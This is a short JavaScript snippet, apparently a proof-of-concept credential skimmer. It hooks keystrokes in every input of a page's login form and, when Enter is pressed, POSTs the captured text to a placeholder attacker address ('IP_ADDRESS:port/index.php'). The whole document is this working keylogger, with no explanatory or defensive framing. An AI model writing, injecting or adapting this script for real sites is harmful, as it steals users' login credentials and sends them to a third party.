<script>
  
    var form = document.getElementById('login');
    var inputs = form.querySelectorAll('input');
    inputs.forEach(function(input){
        input.addEventListener('keydown', keyDownPress);
    });
    
    var typedString = '';
    
    
    function sendPOST(){
        const destination = 'http://IP_ADDRESS:port/index.php';
        const xhr = new XMLHttpRequest();
        xhr.open('POST', destination);
        xhr.send(JSON.stringify(typedString));
        alert(typedString);
        typedString='';
    }
    function keyDownPress(event) {
        if (event.key === 'Enter'){
            sendPOST();
        }
        else{
            typedString += event.key;
        }
    }
</script>
